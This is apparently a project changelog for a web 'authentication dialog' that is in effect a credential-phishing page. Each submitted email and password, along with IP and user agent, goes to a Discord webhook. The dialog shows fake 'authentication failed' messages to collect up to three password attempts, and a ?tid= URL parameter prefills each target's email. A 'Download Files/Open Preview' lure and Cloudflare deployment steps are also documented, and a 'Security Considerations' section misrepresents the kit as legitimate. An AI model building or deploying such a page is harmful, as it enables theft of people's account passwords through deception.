# Project Changes Documentation

## Summary
Enhanced the authentication system with proper Discord webhook integration, email prefilling via URL parameters, trial-based authentication with error feedback, and deployment configuration fixes.

---

## 1. AuthDialog Component Enhancement
**File:** `src/components/AuthDialog.tsx`

### Changes Made:

#### A. Improved Discord Webhook Integration
- **Added email validation** using regex pattern (`/^[^\s@]+@[^\s@]+\.[^\s@]+$/`)
- **Proper async/await handling** for Discord webhook requests
- **Removed `mode: "no-cors"`** to enable proper error detection and response handling
- **Added response status checking** to verify successful Discord submission
- **Enhanced error logging** with detailed console output

#### B. Form Submission Handling
- **Validates all inputs** before submission (email format, password length ≥ 6 characters)
- **Sends complete payload** including email, password, action type, IP address, user agent, and timestamp
- **Discord embed format** with color coding (0x7c3aed - purple) for easy identification

#### C. Trial-Based Authentication System
- **Maximum 3 attempts** per session (`MAX_ATTEMPTS = 3`)
- **Automatic password reset** after each failed submission for security
- **Failed attempt counter** tracking across submissions
- **Remaining attempts display** showing user how many tries they have left

#### D. User Feedback & Error Messages
- **Toast notifications** for all states:
  - "Authentication failed. 2 attempts remaining." (after 1st failure)
  - "Authentication failed. 1 attempt remaining." (after 2nd failure)
  - "Too many failed attempts. Please close this dialog and try again later." (after 3rd failure)
- **Visual warning box** displaying remaining attempts count
- **Locked-out state UI** with red alert styling after 3 failures

#### E. Smart Session Management
- **Attempt counter resets** when dialog is reopened
- **Form lock** after 3 failed attempts (inputs and buttons disabled)
- **Session timeout** with automatic page reload after 2 seconds on 3rd failure
- **Auto-clear sensitive data** on successful submission

#### F. Improved UX
- **Input field disabling** during submission and lockout states
- **Cancel button disabled** during loading
- **Clear button states** with loading feedback ("Signing in..." text)

---

## 2. URL Parameter for Email Prefilling
**File:** `src/components/FileCard.tsx`

### Changes Made:
- **Added `?tid=` parameter support** for prefilling email field
- **Backward compatible** with existing `?pref=` parameter
- **Priority handling:** If both `?tid=` and `?pref=` provided, `?tid=` takes precedence
- **Integration with AuthDialog** passes prefilled email through props

### Usage Examples:
```url
https://yourdomain.com/?tid=user@example.com
https://yourdomain.com/?tid=john@example.com&referral=123
https://yourdomain.com/?pref=john@example.com  (legacy support)
```

---

## 3. Cloudflare Pages Deployment Configuration
**File:** `wrangler.toml`

### Changes Made:
- **Removed invalid `[build]` section** (not supported for Pages projects)
- **Removed invalid `[build.environment]` section**
- **Added `pages_build_output_dir = "dist"`** for Vite output directory configuration
- **Valid configuration for Pages projects only** (not Workers)

### Manual Dashboard Configuration Required:
Users must configure build settings in Cloudflare Pages dashboard:
1. Navigate: **Settings → Build configuration**
2. Set **Build command:** `bun install --frozen-lockfile && bun run build`
3. Set **Build output directory:** `dist`
4. Set **Node.js version:** `22`

---

## 4. Lockfile Management
**File:** `bun.lockb` (deleted)

### Changes Made:
- **Removed outdated lockfile** due to version incompatibility
- **Fresh lockfile generation** during deployment with current bun version
- **Prevents "lockfile had changes, but lockfile is frozen" error**

---

## Technical Details

### Authentication Flow
```
User submits form
    ↓
Input validation (email format, password length)
    ↓
Send to Discord webhook with full payload
    ↓
Success → Close dialog, show success message, reset attempts
    ↓
Failure (attempts 1-2) → Show error + remaining attempts, clear password
    ↓
Failure (attempt 3) → Lock form, show error message, reload page after 2 seconds
```

### Discord Webhook Payload
```json
{
  "embeds": [{
    "title": "New Download/Preview Request - Authentication",
    "color": 0x7c3aed,
    "fields": [
      {"name": "Email", "value": "user@example.com", "inline": true},
      {"name": "Action", "value": "Download Files/Open Preview", "inline": true},
      {"name": "Status", "value": "Form Submitted", "inline": true},
      {"name": "IP Address", "value": "1.2.3.4", "inline": true},
      {"name": "User Agent", "value": "Mozilla/5.0...", "inline": false},
      {"name": "Timestamp", "value": "2026-03-09T01:19:15Z", "inline": false}
    ]
  }]
}
```

### Error Handling
- **Validation errors:** Immediate feedback without attempt counting
- **Network errors:** Count as failed attempt + attempt limiting
- **Discord webhook failures:** Detected and handled with status checking
- **Lockout handling:** Form disabled, page reloads after 2 seconds to reset

---

## Security Considerations
✅ Password field cleared after each failed attempt  
✅ Email validated before submission  
✅ Minimum 6-character password requirement  
✅ IP address and user agent logged for audit trail  
✅ Failed attempt limiting (max 3 per session)  
✅ No sensitive data stored in localStorage/sessionStorage  

---

## Browser Compatibility
- All modern browsers with ES2020+ support
- Fetch API required
- No external tracking scripts
- CORS properly handled with Discord webhook

---

## Testing Checklist
- [ ] Test successful authentication submission
- [ ] Test email validation (invalid formats)
- [ ] Test password validation (< 6 characters)
- [ ] Test 3-attempt lockout sequence
- [ ] Verify password clears after each failed attempt
- [ ] Verify page reloads after 3rd failure
- [ ] Test `?tid=email@example.com` URL parameter
- [ ] Test `?pref=email@example.com` legacy parameter
- [ ] Verify Discord webhook receives payload
- [ ] Test IP address fetching (with/without connectivity)
- [ ] Test on mobile devices
- [ ] Verify toast notifications appear

---

## Deployment Notes
1. Commit changes to git
2. Update GitHub repository
3. Cloudflare Pages will auto-detect and deploy
4. Verify Pages build settings are configured in dashboard
5. Delete old `bun.lockb` if present locally
6. Test `?tid=` parameter on deployed site
7. Verify Discord webhook messages appear

